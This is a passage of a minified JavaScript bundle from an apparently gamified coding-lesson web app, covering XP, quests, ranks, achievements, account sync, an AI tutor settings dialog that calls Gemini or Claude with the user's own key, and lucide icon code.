console.log("of total:", COMMITS.length);`,check:{expr:'output.includes("well-formed commits: 3") && output.includes("of total: 6")',hint:"Exactly three of the six read like a professional history: two are placeholders and one is too short.",hints:[{tier:1,text:"Two independent conditions: word count, and placeholder-free. A message must satisfy both."},{tier:2,text:"Split on whitespace for the word count. For placeholders, lowercase each word and strip a trailing colon before comparing."},{tier:3,text:'`messages.filter((m) => { const words = m.trim().split(/\\s+/); if (words.length < 3) return false; return !words.some((w) => PLACEHOLDERS.includes(w.toLowerCase().replace(/:$/, ""))); }).length`'}]}}}],fI=el.reduce((e,t)=>e+t.xp,0);function JP(e,t,n){var a;const s=[],r=[];for(const l of e.skills){const[c,u]=l.split("/");Ni(t,XP(c,u))<1&&(r.push(l),s.push(((a=YP(c,u))==null?void 0:a.title)??l))}const i=n[e.id],o=s.length===0;return{milestone:e,unlocked:o,skillsDone:e.skills.length-s.length,skillsTotal:e.skills.length,missingKeys:r,missingSkills:s,claimed:!!i,earned:!!i&&o,claimedAt:(i==null?void 0:i.at)??null,deliverablesDone:i?i.deliverables.length:0}}function mI(e,t){return el.map(n=>JP(n,e,t))}function Wb(e,t){const n={...e};for(const[s,r]of Object.entries(t)){const i=n[s];(!i||r.deliverables.length>i.deliverables.length||r.deliverables.length===i.deliverables.length&&r.at<i.at)&&(n[s]=r)}return n}function ZP(e){let t=0;for(const n of el)e[n.id]&&(t+=n.xp);return t}function gI(e){return el.filter(t=>e[t.id]).length}const eq="clr-milestones-v1";function tq(e){const t={};if(!e||typeof e!="object")return t;for(const[n,s]of Object.entries(e)){if(!s||typeof s!="object")continue;const{at:r,deliverables:i}=s;if(typeof r!="string"||!/^\d{4}-\d{2}-\d{2}$/.test(r)||!Array.isArray(i))continue;const o=[...new Set(i.map(a=>typeof a=="number"?a:Number(a)).filter(a=>Number.isInteger(a)&&a>=0))].sort((a,l)=>a-l);o.length!==0&&(t[n]={at:r,deliverables:o})}return t}const ji=qi(eq,e=>tq(wi(e)));function Km(e){return ji.subscribe(e)}function Vs(){return ji.get()}function Ub(e){ji.set(e)}function nq(e){const t=Wb(Vs(),e);return Ub(t),t}function yI(e,t,n){const s=Vs(),r=s[e];if(r&&r.deliverables.length>=t.length)return s;const i={...s,[e]:{at:n,deliverables:[...t].sort((o,a)=>o-a)}};return Ub(i),i}function Ym(){ji.reset()}function wI(){return Th(ji)}function sq(){return ZP(Vs())}function rc(e){if(typeof e!="string")return!1;const t=e.trim();if(/[\s\u0000-\u001f]/.test(t))return!1;const n=t.match(/^[a-z][a-z0-9+.-]*:\/\/([^/?#]+)/i);return!!n&&n[1].length>0}function rq(e,t,n){var s;if(typeof e=="string"){const r=e.trim();if(rc(r))return r;const i=typeof window<"u"&&((s=window.location)!=null&&s.origin)?window.location.origin:void 0;if(/^(\.{0,2}\/)/.test(r)&&i&&rc(i))try{const a=new URL(r,i).toString();if(rc(a))return a.replace(/\/$/,"")}catch{}}return t}function vI(e){const t=e instanceof Error?e.message:String(e??""),n=t.match(/Uncaught Error:\s*([^\n]+)/);return(n?n[1]:t.split(`
`).pop()??t).trim()||"Something went wrong — try again."}function Xm(e){const t=e instanceof Error?e.message:String(e??"");return/invalid/i.test(t)&&/credential|password|email/i.test(t)?"Wrong email or password.":/already exists|already registered/i.test(t)?"That email already has an account — sign in instead.":/weak/i.test(t)?"Password too weak — use at least 8 characters.":/rate limit|too many/i.test(t)?"Too many attempts — wait a minute and retry.":/fetch|network|Failed to fetch|WebSocket/i.test(t)?"Can't reach the sync server right now — try again shortly.":t||"Something went wrong — try again."}function iq(e){const t=e.match(/Could not find public (?:function|query|mutation)[^'"]*['"]([^'"]+)['"]/i);return t?t[1]:null}function Ch(e){const t=e instanceof Error?e.message:String(e??""),n=iq(t);return n?{title:"This feature needs a newer server",body:`The app asked the backend for “${n}” and the deployed backend doesn't have it yet — normally because the site shipped before its Convex functions were deployed. Your lessons, XP and saved progress are unaffected. Everything else in the app keeps working; try again in a few minutes.`}:/CONVEX [QM]\(|Server Error/i.test(t)?{title:"The guild server couldn't answer that",body:"The backend rejected this request, which usually means it's busy or being updated. Nothing in your account changed — try again in a moment."}:/fetch|network|failed to reach|Could not reach|connection/i.test(t)?{title:"Can't reach the server",body:"The request never made it out. Check your connection and try again — your progress on this device is saved either way."}:/not signed in|unauthorized|\b401\b/i.test(t)?{title:"Sign in to load this",body:"This panel shows your own data, so it needs you signed in. Sign in and reload."}:{title:"We couldn't load this panel",body:"Something on the server side went wrong. The rest of the page still works and your progress is safe — try again in a moment."}}function zb(e){return 50+(e>=1?25:0)}function $b(e){const t=new Map;for(const[n,s]of Object.entries(e.completed)){const r=Oi(n),i=n.split("!")[1]??"",o=t.get(r);(!o||s>o.score)&&t.set(r,{score:s,day:i})}return t}function Mi(e){const t=new Map;for(const n of $b(e).values()){const s=t.get(n.day)??{day:n.day,lessons:0,xp:0,flawless:0};s.lessons+=1,s.xp+=zb(n.score),n.score>=1&&(s.flawless+=1),t.set(n.day,s)}return t}function oq(e){let t=0;for(const{score:n}of $b(e).values())t+=zb(n);return t}const Ah=[{id:"show-up",icon:"⚔️",title:"First Blood",detail:"Finish 1 lesson today",target:1,metric:"lessons",bonus:60},{id:"triple",icon:"🔥",title:"Triple Threat",detail:"Finish 3 lessons today",target:3,metric:"lessons",bonus:150},{id:"xp-hunter",icon:"✦",title:"XP Hunter",detail:"Earn 200 XP today",target:200,metric:"xp",bonus:100},{id:"flawless",icon:"◎",title:"Flawless Run",detail:"Score 100% on any lesson today",target:1,metric:"flawless",bonus:75}],aq=25;function Hb(e,t){return t==="lessons"?e.lessons:t==="xp"?e.xp:e.flawless}function Qb(e){if(!e)return 0;let t=0;for(const n of Ah)Hb(e,n.metric)>=n.target&&(t+=n.bonus);return t}function lq(e){const t=new Date(e+"T00:00:00Z");return t.setUTCDate(t.getUTCDate()-1),t.toISOString().slice(0,10)}function cq(e,t){return e.has(lq(t))?aq:0}function Eh(e){return new Set([...e.keys()].filter(t=>t!==""))}function Gb(e,t,n){const s=e.get(n);return s?s.xp+Qb(s)+cq(t,n):0}function Jm(e,t,n){const s=Mi(e),r=Eh(s);let i=0;for(const o of r)o<t||o>n||(i+=Gb(s,r,o));return i}function tl(e){const t=Mi(e),n=Eh(t);let s=0;for(const[r,i]of t)s+=r===""?i.xp:Gb(t,n,r);return s}function bI(e){return tl(e)-oq(e)}function uq(e,t=0){return tl(e)+Math.max(0,Math.floor(t))}function dq(e,t){const s=Mi(e).get(t);return Ah.map(r=>{const i=s?Hb(s,r.metric):0;return{id:r.id,icon:r.icon,title:r.title,detail:r.detail,progress:Math.min(i,r.target),target:r.target,bonus:r.bonus,done:i>=r.target}})}function xI(e,t){return dq(e,t).filter(n=>n.done).length}function Kb(e){const t=new Date(e+"T00:00:00Z"),n=(t.getUTCDay()+6)%7;return t.setUTCDate(t.getUTCDate()-n),t.toISOString().slice(0,10)}function hq(e){return e.slice(0,8)+"01"}const go=250;function pq(e){const t=Math.floor(e/go)+1,n=e%go;return{level:t,intoLevel:n,toNext:go-n,pct:Math.round(n/go*100)}}function fq(e,t,n){const r=[...new Set(Object.keys(e.completed).map(c=>c.split("!")[1]).filter(c=>!!c))].sort();if(!r.length)return{current:0,longest:0,lastDay:null};let i=1,o=1;for(let c=1;c<r.length;c++)r[c]===Zm(r[c-1])?o+=1:o=1,i=Math.max(i,o);const a=r[r.length-1];let l=0;if(a===t||n.has(a)){l=1;for(let c=r.length-1;c>0&&r[c]===Zm(r[c-1]);c--)l+=1}return{current:l,longest:i,lastDay:a}}function Zm(e){const t=new Date(e+"T00:00:00Z");return t.setUTCDate(t.getUTCDate()+1),t.toISOString().slice(0,10)}function kI(e){return[...new Set(Object.keys(e.completed).map(t=>t.split("!")[1]).filter(t=>!!t))].sort()}function SI(e,t){return Object.keys(e.completed).filter(n=>n.split("!")[1]===t).length}const Rr=[{id:"initiate",name:"Initiate",roman:"I",minLevel:1,frame:"from-ink-300 to-ink-200",accent:"text-ink-600",perk:"Your name on the board"},{id:"apprentice",name:"Apprentice",roman:"II",minLevel:2,frame:"from-emerald-400 to-emerald-200",accent:"text-emerald-600",perk:"Emerald frame + first titles"},{id:"adept",name:"Adept",roman:"III",minLevel:4,frame:"from-sky-400 to-cyan-200",accent:"text-sky-600",perk:"Aurora frame + animated streak flame"},{id:"veteran",name:"Veteran",roman:"IV",minLevel:6,frame:"from-violet-500 to-fuchsia-300",accent:"text-violet-600",perk:"Violet frame + guild banner slot"},{id:"archon",name:"Archon",roman:"V",minLevel:9,frame:"from-gold-500 to-gold-300",accent:"text-gold-600",perk:"Gilded frame + glowing rank row"},{id:"ascendant",name:"Ascendant",roman:"VI",minLevel:12,frame:"from-rose-500 via-fuchsia-400 to-gold-300",accent:"text-rose-600",perk:"Tri-color frame + rare titles"},{id:"mythic",name:"Mythic",roman:"VII",minLevel:16,frame:"from-gold-300 via-paper-50 to-gold-500",accent:"text-gold-700",perk:"Living prism frame + Mythic titles"}];function Aa(e){let t=0;for(let o=0;o<Rr.length;o++)e>=Rr[o].minLevel&&(t=o);const n=Rr[t],s=Rr[t+1]??null,r=s?s.minLevel-n.minLevel:0,i=s?e-n.minLevel:0;return{current:n,next:s,levelsToNext:s?s.minLevel-e:0,pct:s?Math.round(i/r*100):100}}function Yb(e,t){return Rr.find(n=>n.id===e)??Aa(t).current}const Rh=[{id:"novice",label:"Novice",minLevel:1},{id:"cadet",label:"Code Cadet",minLevel:2},{id:"slinger",label:"Syntax Slinger",minLevel:4},{id:"bugslayer",label:"Bug Slayer",minLevel:6},{id:"refactorer",label:"The Refactorer",minLevel:8},{id:"architect",label:"Systems Architect",minLevel:11},{id:"ascendant",label:"Ascendant",minLevel:14},{id:"mythic",label:"Mythic Mind",minLevel:16}];function mq(e){return Rh.filter(t=>t.minLevel<=e).reverse()}function Xb(e){var t;return e?((t=Rh.find(n=>n.id===e))==null?void 0:t.label)??e:null}function TI(e){var t;return((t=mq(e)[0])==null?void 0:t.id)??Rh[0].id}const gq=[{id:"first-steps",icon:"①",title:"First Steps",description:"Complete your first lesson."},{id:"flawless",icon:"◎",title:"Flawless",description:"Score 100% on any lesson quiz."},{id:"streak-3",icon:"③",title:"Three-Day Streak",description:"Learn something 3 days in a row."},{id:"streak-7",icon:"⑦",title:"Week Warrior",description:"Learn something 7 days in a row."},{id:"xp-1000",icon:"✦",title:"1,000 XP",description:"Earn 1,000 XP across all lessons."},{id:"track-finisher",icon:"❖",title:"Track Finisher",description:"Complete every lesson in a track."},{id:"explorer",icon:"❂",title:"Explorer",description:"Finish a lesson in 5 different tracks."},{id:"polyglot",icon:"✺",title:"Polyglot",description:"Finish a lesson in every track."},{id:"level-5",icon:"♛",title:"Seasoned",description:"Reach level 5."},{id:"perfect-day",icon:"🏅",title:"Perfect Day",description:"Clear every daily quest in a single day."},{id:"ascended",icon:"❈",title:"Archon Ascendant",description:"Ascend to the Archon tier."},{id:"guildmate",icon:"⚔",title:"Guildmate",description:"Join a guild."},{id:"guild-founder",icon:"⚑",title:"Guild Founder",description:"Found your own guild."}];function CI(e,t,n={}){const s=n.level??0,r=n.clanRole??"none",i=(()=>{const d=Mi(e),h=Eh(d);for(const m of h)if(Qb(d.get(m))===Ah.reduce((f,v)=>f+v.bonus,0))return!0;return!1})(),o=Object.keys(e.completed).filter(d=>(e.completed[d]??0)>=1),a=o.map(Oi),l=new Set(a.map(d=>d.split("/")[0])),c=o.some(d=>e.completed[d]>=1),u=d=>{const h=Dt.find(m=>m.id===d);return h?h.lessons.every(m=>Ni(e,d+"/"+m.id)>=1):!1};return gq.map(d=>{let h=!1;switch(d.id){case"first-steps":h=a.length>=1;break;case"flawless":h=c;break;case"streak-3":h=t.current>=3||t.longest>=3;break;case"streak-7":h=t.current>=7||t.longest>=7;break;case"xp-1000":h=tl(e)>=1e3;break;case"track-finisher":h=Dt.some(m=>u(m.id));break;case"explorer":h=l.size>=5;break;case"polyglot":h=l.size>=Dt.length;break;case"level-5":h=s>=5;break;case"perfect-day":h=i;break;case"ascended":h=s>=Aa(s).current.minLevel&&Aa(s).current.id==="archon";break;case"guildmate":h=r!=="none";break;case"guild-founder":h=r==="owner";break}return{...d,earned:h}})}function bi(e=new Date){return e.toISOString().slice(0,10)}function yq(e=new Date){const t=new Date(e);t.setUTCDate(t.getUTCDate()-1);const n=new Date(e);return n.setUTCDate(n.getUTCDate()-2),new Set([bi(t),bi(n)])}const Jb=w.createContext(null);function wq({children:e}){const t=cP(),{isLoading:n}=Q2(),s=zr(Rt.users.me),r=zr(Rt.progress.get),i=zr(Rt.progress.getClaims),o=Er(Rt.progress.save),a=Er(Rt.progress.saveClaims),l=Er(Rt.progress.wipe),c=Er(Rt.profiles.sync),[u,d]=w.useState("idle"),h=w.useRef(""),m=w.useRef(""),f=w.useRef(null),v=w.useRef(""),x=w.useRef(""),y=w.useRef(null),g=w.useRef([]),b=s!=null,k=!n&&s!==void 0;w.useEffect(()=>{if(s){const R=g.current;g.current=[];for(const M of R)M()}},[s]),w.useEffect(()=>{if(!b||!r)return;const R=JSON.stringify(r);if(R===h.current)return;h.current=R;const M=Is().completed,Q=yP({completed:M},{completed:r}),$=JSON.stringify(Q.completed);$!==JSON.stringify(M)&&Fb(Q),m.current=$},[b,r]),w.useEffect(()=>{if(!b)return;const R=Hm(()=>{const M=JSON.stringify(Is().completed);M!==m.current&&(m.current=M,d("syncing"),f.current&&window.clearTimeout(f.current),f.current=window.setTimeout(()=>{o({data:Is().completed}).then(()=>d("synced")).catch(()=>d("error"))},600))});return()=>{R(),f.current&&window.clearTimeout(f.current)}},[b,o]),w.useEffect(()=>{if(!b||!i)return;const R=JSON.stringify(i);if(R===v.current)return;v.current=R;const M=Vs(),Q=Wb(M,i),$=JSON.stringify(Q);$!==JSON.stringify(M)&&nq(i),x.current=$},[b,i]),w.useEffect(()=>{if(!b)return;const R=Km(()=>{const M=JSON.stringify(Vs());M!==x.current&&(x.current=M,d("syncing"),y.current&&window.clearTimeout(y.current),y.current=window.setTimeout(()=>{a({claims:Vs()}).then(()=>d("synced")).catch(()=>d("error"))},600))});return()=>{R(),y.current&&window.clearTimeout(y.current)}},[b,a]),w.useEffect(()=>{if(!b)return;const R=()=>{const $=Is(),Ue=bi(),D=fq($,Ue,yq()),_=pq(tl($)),U=new Set(Object.entries($.completed).filter(([,A])=>A>=1).map(([A])=>Oi(A))).size;c({xp:uq($,vP()+sq()),xpWeek:Jm($,Kb(Ue),Ue),xpMonth:Jm($,hq(Ue),Ue),level:_.level,ascension:Aa(_.level).current.id,streakCurrent:D.current,streakLongest:D.longest,lastActiveDay:D.lastDay??void 0,lessonsDone:U,sourceDay:Ue}).catch(()=>{})};R();const M=Hm(R),Q=Km(R);return()=>{M(),Q()}},[b,c]);const C=w.useCallback(async(R,M)=>{try{await t.signIn("password",{email:R,password:M,flow:"signIn"}),await eg(g)}catch(Q){throw new Error(Xm(Q))}},[t]),E=w.useCallback(async(R,M,Q)=>{try{await t.signIn("password",{name:R,email:M,password:Q,flow:"signUp"}),await eg(g)}catch($){throw new Error(Xm($))}},[t]),S=w.useCallback(async()=>{await t.signOut(),Lu(),Ym(),Qm(),h.current="",m.current="",v.current="",x.current="",d("idle")},[t]),T=w.useCallback(async()=>{if(Lu(),Ym(),Qm(),m.current="",x.current="",b){try{await l({})}catch{d("error");return}d("synced")}},[b,l]),q=w.useMemo(()=>({user:s?{displayName:s.name,email:s.email}:null,authReady:k,sync:u,signIn:C,signUp:E,signOutUser:S,resetEverything:T}),[s,k,u,C,E,S,T]);return p.jsx(Jb.Provider,{value:q,children:e})}function eg(e){return new Promise((t,n)=>{const s=window.setTimeout(()=>{const i=e.current.indexOf(r);i>=0&&e.current.splice(i,1),n(new Error("Signed in, but the session didn't load in time — check your connection and try again."))},8e3);function r(){window.clearTimeout(s);const i=e.current.indexOf(r);i>=0&&e.current.splice(i,1),t()}e.current.push(r)})}const vq="accomplished-hyena-726",bq="https://accomplished-hyena-726.convex.cloud",xq=rq(`https://${vq}.convex.cloud`,bq);function kq({children:e}){const t=w.useMemo(()=>new F2(xq),[]);return p.jsx(Ib,{client:t,children:p.jsx(uP,{client:t,children:p.jsx(wq,{children:e})})})}function Li(){const e=w.useContext(Jb);if(!e)throw new Error("useAccount must be used inside <AccountProvider>");return e}const Sq="cl_ai_settings",Tq={tutorName:""};function Cq(e){const t=wi(e),n=t.provider==="gemini"||t.provider==="claude"?t.provider:null,s=t.keys,r={};if(s&&typeof s=="object")for(const[i,o]of Object.entries(s))(i==="gemini"||i==="claude")&&typeof o=="string"&&(r[i]=o);return{provider:n,keys:r,tutorName:typeof t.tutorName=="string"?t.tutorName:Tq.tutorName}}const Ph=qi(Sq,Cq);function Zb(){return Ph.get()}function Aq(e){Ph.set(e)}function AI(){return Th(Ph)}const Eq=45e3;async function EI(e,t){const n=t??Zb();if(!n.provider||!n.keys[n.provider])throw new Error("No AI provider configured. Add your API key in Settings.");const s=new AbortController,r=setTimeout(()=>s.abort(),Eq);try{return n.provider==="gemini"?await Rq(e,n.keys.gemini,s.signal):await Pq(e,n.keys.claude,s.signal)}catch(i){throw s.signal.aborted?new Error("The AI provider didn't respond in time — try again."):i}finally{clearTimeout(r)}}async function Rq(e,t,n){var c,u,d,h,m;const s=e.filter(f=>f.role!=="system").map(f=>({role:f.role==="assistant"?"model":"user",parts:[{text:f.content}]})),r=e.find(f=>f.role==="system"),i={contents:s};r&&(i.systemInstruction={parts:[{text:r.content}]});const o=await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${t}`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(i),signal:n});if(!o.ok){const f=await o.text().catch(()=>"");throw new Error(`Gemini API error (${o.status}): ${f.slice(0,200)}`)}const a=await o.json(),l=(m=(h=(d=(u=(c=a==null?void 0:a.candidates)==null?void 0:c[0])==null?void 0:u.content)==null?void 0:d.parts)==null?void 0:h[0])==null?void 0:m.text;if(!l)throw new Error("Gemini returned an empty response.");return l}async function Pq(e,t,n){var l,c,u;const s=((l=e.find(d=>d.role==="system"))==null?void 0:l.content)??"",r=e.filter(d=>d.role!=="system").map(d=>({role:d.role,content:d.content})),i=await fetch("https://api.anthropic.com/v1/messages",{method:"POST",headers:{"Content-Type":"application/json","x-api-key":t,"anthropic-version":"2023-06-01","anthropic-dangerous-direct-browser-access":"true"},signal:n,body:JSON.stringify({model:"claude-sonnet-4-20250514",max_tokens:1024,system:s,messages:r})});if(!i.ok){const d=await i.text().catch(()=>"");throw new Error(`Claude API error (${i.status}): ${d.slice(0,200)}`)}const o=await i.json(),a=(u=(c=o==null?void 0:o.content)==null?void 0:c[0])==null?void 0:u.text;if(!a)throw new Error("Claude returned an empty response.");return a}const tg="w-full rounded-xl border border-paper-300 bg-paper-50 px-4 py-2.5 text-sm text-ink-950 outline-none transition placeholder:text-ink-400 focus:border-gold-400 focus:ring-2 focus:ring-gold-400/25";function qq({onClose:e}){const[t,n]=w.useState(Zb),[s,r]=w.useState(!1),i=w.useRef(null);w.useEffect(()=>{var u;(u=i.current)==null||u.focus();const c=d=>{d.key==="Escape"&&e()};return window.addEventListener("keydown",c),()=>window.removeEventListener("keydown",c)},[e]);const o=c=>{n(u=>({...u,...c})),r(!1)},a=()=>{Aq(t),r(!0)},l=c=>{var u;return!!(c&&((u=t.keys[c])!=null&&u.trim()))};return p.jsx("div",{className:"fixed inset-0 z-50 flex items-center justify-center bg-ink-950/40 p-4 backdrop-blur-sm",onMouseDown:c=>{c.target===c.currentTarget&&e()},children:p.jsxs("div",{role:"dialog","aria-modal":"true","aria-labelledby":"ai-settings-title",className:"w-full max-w-lg rounded-2xl border border-paper-200 bg-paper-50 p-8 shadow-lift",children:[p.jsx("p",{className:"eyebrow",children:"settings"}),p.jsx("h2",{id:"ai-settings-title",className:"mt-2 font-display text-3xl font-semibold tracking-tight text-ink-950",children:"AI Tutor Settings"}),p.jsx("p",{className:"mt-2 text-sm leading-relaxed text-ink-600",children:"The Socratic tutor is 100% optional. If you want guided help, bring your own API key for Google Gemini or Anthropic Claude. Keys stay in your browser and are sent only to the provider you choose."}),p.jsxs("div",{className:"mt-6 space-y-3",children:[p.jsx("p",{className:"font-mono text-[11px] uppercase tracking-widest text-ink-500",children:"provider"}),p.jsx("div",{className:"flex gap-3",children:["gemini","claude"].map(c=>p.jsxs("button",{type:"button",onClick:()=>o({provider:t.provider===c?null:c}),className:`flex-1 rounded-xl border px-4 py-3 text-left transition ${t.provider===c?"border-gold-400 bg-gold-400/10 ring-2 ring-gold-400/25":"border-paper-200 hover:border-ink-300"}`,children:[p.jsx("span",{className:"block font-display text-lg font-semibold text-ink-950",children:c==="gemini"?"Google Gemini":"Anthropic Claude"}),p.jsx("span",{className:"mt-0.5 block text-xs text-ink-600",children:l(c)?"key saved":"no key"})]},c))})]}),t.provider&&p.jsx("div",{className:"mt-5 space-y-3",children:p.jsxs("div",{children:[p.jsx("label",{className:"mb-1 block font-mono text-[11px] uppercase tracking-widest text-ink-500",children:t.provider==="gemini"?"Gemini API Key":"Claude API Key"}),p.jsx("input",{ref:i,type:"password",value:t.keys[t.provider]??"",onChange:c=>o({keys:{...t.keys,[t.provider]:c.target.value}}),className:tg,placeholder:t.provider==="gemini"?"AIza...":"sk-ant-..."}),p.jsx("p",{className:"mt-1 text-[11px] text-ink-500",children:t.provider==="gemini"?"Get a key at aistudio.google.com":"Get a key at console.anthropic.com"})]})}),p.jsxs("div",{className:"mt-5",children:[p.jsx("label",{className:"mb-1 block font-mono text-[11px] uppercase tracking-widest text-ink-500",children:"Your name (optional, for the tutor)"}),p.jsx("input",{value:t.tutorName,onChange:c=>o({tutorName:c.target.value}),className:tg,placeholder:"e.g. Ada"})]}),p.jsxs("div",{className:"mt-6 flex items-center justify-between",children:[p.jsx("button",{type:"button",onClick:e,className:"font-mono text-sm text-ink-600 hover:text-ink-950",children:"close"}),p.jsxs("div",{className:"flex items-center gap-3",children:[s&&p.jsx("span",{className:"font-mono text-xs text-green-600",children:"saved!"}),p.jsx("button",{type:"button",onClick:a,className:"btn-gold !px-5",children:"Save"})]})]})]})})}/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Oq=e=>e==null?void 0:e.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase();/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */function Iq(e,t,n=[]){if(t==null)throw new Error("[lucide]: iconNode is required when icon name is used");return{name:Oq(e),size:24,node:t,...n.length>0?{aliases:n}:{}}}/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Nq=e=>{let t="",n=!1;for(const s of e){if(s==="-"||s==="_"||s<=" "){n=t.length>0;continue}t.length===0?t+=s.toLowerCase():t+=n?s.toUpperCase():s,n=!1}return t};/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const jq=e=>{const t=Nq(e);return t.charAt(0).toUpperCase()+t.slice(1)};/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Du=(...e)=>e.filter((t,n,s)=>!!t&&t.trim()!==""&&s.indexOf(t)===n).join(" ").trim();/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Mn={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":2,"stroke-linecap":"round","stroke-linejoin":"round"};/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */function ic(e){return e!=null}function Mq(e,t={}){var h,m;const n=t.attributeNames??{},s=f=>n[f]??f,r=e.size??e.width??Mn.width,i=e.size??e.height??Mn.height,o=((h=e.aliases)==null?void 0:h.filter(f=>typeof f=="string"&&f.trim()!=="").map(f=>`lucide-${f}`))??[],a=[...e.name?[`lucide-${e.name}`]:[],...o],l=((m=t.className)==null?void 0:m.split(" ").filter(Boolean))??[],c=t.includeDefaultClasses===!1?Du(...l):Du("lucide",...a,...l),u=t.absoluteStrokeWidth?Number(t.strokeWidth??Mn["stroke-width"])*Number(e.size??e.width??Mn.width)/Number(t.size??t.width??Mn.width):t.strokeWidth??Mn["stroke-width"];return["svg",{...Object.entries(Mn).reduce((f,[v,x])=>(f[s(v)]=x,f),{}),..."color"in t&&t.color&&{[s("stroke")]:t.color},..."size"in t&&ic(t.size)&&{[s("width")]:t.size,[s("height")]:t.size},..."width"in t&&ic(t.width)&&{[s("width")]:t.width},..."height"in t&&ic(t.height)&&{[s("height")]:t.height},[s("stroke-width")]:u,...c&&{[s("class")]:c},[s("viewBox")]:`0 0 ${r} ${i}`,...t.hasA11yProp===!1?{[s("aria-hidden")]:"true"}:{},..."attributes"in t&&t.attributes},e.node.map(f=>{const[v,x,y]=f,g=t.nonScalingStroke?{[s("vector-effect")]:"non-scaling-stroke",...x}:x;return y?[v,g,y]:[v,g]})]}/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */function Lq(e,t={}){return Mq(e,{...t,attributeNames:{...t.attributeNames,class:"className","stroke-width":"strokeWidth","stroke-linecap":"strokeLinecap","stroke-linejoin":"strokeLinejoin","vector-effect":"vectorEffect"}})}/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Dq=e=>{for(const t in e)if(t.startsWith("aria-")||t==="role"||t==="title")return!0;return!1},_q=w.createContext({}),Fq=()=>w.useContext(_q),Bq=w.forwardRef(({color:e,size:t,width:n,height:s,strokeWidth:r,absoluteStrokeWidth:i,nonScalingStroke:o,className:a="",children:l,iconNode:c=[],icon:u={node:c,aliases:[],size:24},...d},h)=>{const{size:m=24,strokeWidth:f=2,absoluteStrokeWidth:v=!1,nonScalingStroke:x=!1,color:y="currentColor",className:g=""}=Fq()??{},b=!!l||Dq(d),[k,C,E=[]]=Lq(u,{color:e??y,width:n??t??m,height:s??t??m,strokeWidth:r??f,absoluteStrokeWidth:i??v,nonScalingStroke:o??x,className:Du(g,a),hasA11yProp:b,attributes:d});return w.createElement(k,{ref:h,...C},[...E.map(([S,T])=>w.createElement(S,T)),...Array.isArray(l)?l:[l]])});/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */function ls(e,t=[],n=[]){const s=typeof e=="string"?Iq(e,t,n):e,r=w.forwardRef(({className:i,...o},a)=>w.createElement(Bq,{ref:a,icon:s,className:i,...o}));return s.name&&(r.displayName=jq(s.name)),r}/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ex={name:"book-open",size:24,node:[["path",{d:"M12 5v16",key:"1f6ucr"}],["path",{d:"M20.001 19A2 2 0 0022 17V5a2 2 0 00-1.999-2L16 3.002A5 5 0 0012 5a5 5 0 00-4-2H4a2 2 0 00-2 2v12a2 2 0 001.999 2H8a5 5 0 014 2 5 5 0 014-2z",key:"1fyvmf"}]]};ex.node;const Vq=ls(ex);/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const tx={name:"code-xml",size:24,node:[["path",{d:"m18 16 4-4-4-4",key:"1inbqp"}],["path",{d:"m6 8-4 4 4 4",key:"15zrgr"}],["path",{d:"m14.5 4-5 16",key:"e7oirm"}]],aliases:["code-2"]};tx.node;const Wq=ls(tx);/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const nx={name:"moon",size:24,node:[["path",{d:"M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401",key:"kfwtm"}]]};nx.node;const Uq=ls(nx);/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const sx={name:"sun",size:24,node:[["circle",{cx:"12",cy:"12",r:"4",key:"4exip2"}],["path",{d:"M12 2v2",key:"tus03m"}],["path",{d:"M12 20v2",key:"1lh1kg"}],["path",{d:"m4.93 4.93 1.41 1.41",key:"149t6j"}],["path",{d:"m17.66 17.66 1.41 1.41",key:"ptbguv"}],["path",{d:"M2 12h2",key:"1t8f8n"}],["path",{d:"M20 12h2",key:"1q8mjw"}],["path",{d:"m6.34 17.66-1.41 1.41",key:"1m8zz5"}],["path",{d:"m19.07 4.93-1.41 1.41",key:"1shlcs"}]]};sx.node;const zq=ls(sx);/**
 * @license lucide-react v1.47.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
